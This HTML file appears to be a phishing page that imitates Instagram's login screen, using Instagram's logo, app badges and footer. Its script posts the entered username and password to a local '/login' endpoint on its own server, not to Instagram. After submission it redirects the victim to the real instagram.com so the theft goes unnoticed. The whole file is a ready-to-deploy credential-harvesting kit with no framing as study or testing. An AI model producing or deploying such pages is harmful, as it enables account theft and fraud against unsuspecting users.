<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      max-width: 350px;
      width: 100%;
      text-align: center;
    }

    .login-box {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 20px 40px;
      margin-bottom: 10px;
    }

    .logo {
      margin: 22px auto 12px;
      width: 175px;
    }

    .input-field {
      width: 100%;
      padding: 9px 8px 7px;
      margin-bottom: 6px;
      background-color: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 12px;
      box-sizing: border-box;
    }

    .input-field:focus {
      border: 1px solid #a8a8a8;
      outline: none;
    }

    .login-button {
      width: 100%;
      padding: 5px 9px;
      background-color: #0095f6;
      border: none;
      border-radius: 4px;
      color: white;
      font-weight: bold;
      font-size: 14px;
      margin-top: 8px;
      cursor: pointer;
      height: 30px;
    }

    .login-button:disabled {
      background-color: rgba(0, 149, 246, 0.3);
      cursor: default;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 10px 0 18px;
      color: #8e8e8e;
      font-size: 13px;
      font-weight: bold;
    }

    .divider-line {
      flex-grow: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .divider-text {
      margin: 0 18px;
    }

    .facebook-login {
      color: #385185;
      font-size: 14px;
      font-weight: bold;
      margin-bottom: 20px;
      cursor: pointer;
    }

    .facebook-icon {
      margin-right: 8px;
      font-size: 16px;
    }

    .forgot-password {
      font-size: 12px;
      color: #00376b;
      margin-top: 12px;
      display: inline-block;
    }

    .signup-box {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 25px;
      font-size: 14px;
    }

    .signup-link {
      color: #0095f6;
      font-weight: bold;
      text-decoration: none;
    }

    .app-download {
      text-align: center;
      margin-top: 20px;
    }

    .app-download-text {
      font-size: 14px;
      margin: 10px 0 20px;
    }

    .app-stores {
      display: flex;
      justify-content: center;
      gap: 8px;
    }

    .app-store-img {
      height: 40px;
    }

    .footer {
      margin-top: 20px;
      text-align: center;
      font-size: 12px;
      color: #8e8e8e;
    }

    .footer-links {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      margin-bottom: 16px;
    }

    .footer-link {
      margin: 0 8px 12px;
      color: #8e8e8e;
      text-decoration: none;
    }

    .copyright {
      margin-top: 12px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
      
      <form id="loginForm">
        <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" required>
        <input type="password" id="password" class="input-field" placeholder="Password" required>
        <button type="submit" class="login-button" id="loginButton">Log In</button>
      </form>

      <div class="divider">
        <div class="divider-line"></div>
        <div class="divider-text">OR</div>
        <div class="divider-line"></div>
      </div>

      <div class="facebook-login">
        <span class="facebook-icon"></span> Log in with Facebook
      </div>

      <a href="#" class="forgot-password">Forgot password?</a>
    </div>

    <div class="signup-box">
      Don't have an account? <a href="#" class="signup-link">Sign up</a>
    </div>

    <div class="app-download">
      <p class="app-download-text">Get the app.</p>
      <div class="app-stores">
        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Download on the App Store" class="app-store-img">
        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Get it on Google Play" class="app-store-img">
      </div>
    </div>

    <div class="footer">
      <div class="footer-links">
        <a href="#" class="footer-link">Meta</a>
        <a href="#" class="footer-link">About</a>
        <a href="#" class="footer-link">Blog</a>
        <a href="#" class="footer-link">Jobs</a>
        <a href="#" class="footer-link">Help</a>
        <a href="#" class="footer-link">API</a>
        <a href="#" class="footer-link">Privacy</a>
        <a href="#" class="footer-link">Terms</a>
        <a href="#" class="footer-link">Top Accounts</a>
        <a href="#" class="footer-link">Hashtags</a>
        <a href="#" class="footer-link">Locations</a>
        <a href="#" class="footer-link">Instagram Lite</a>
        <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
        <a href="#" class="footer-link">Meta Verified</a>
      </div>

      <div class="copyright">
        English (UK) © 2025 Instagram from Meta
      </div>
    </div>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const loginButton = document.getElementById('loginButton');

      if (!username || !password) {
        alert('Please fill in all fields');
        return;
      }

      loginButton.disabled = true;
      loginButton.textContent = 'Logging in...';

      try {
        const res = await fetch('/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password })
        });

        const data = await res.json();

        if (res.ok) {
          window.location.href = 'https://instagram.com/';
        } else {
          alert('Error: ' + (data.error || 'Login failed'));
        }
      } catch (error) {
        alert('Connection error');
        console.error(error);
      } finally {
        loginButton.disabled = false;
        loginButton.textContent = 'Log In';
      }
    });

    // Facebook login button functionality
    document.querySelector('.facebook-login').addEventListener('click', () => {
      alert('Redirecting to Facebook login');
      // In a real implementation, this would redirect to Facebook OAuth
    });
  </script>
</body>
</html>
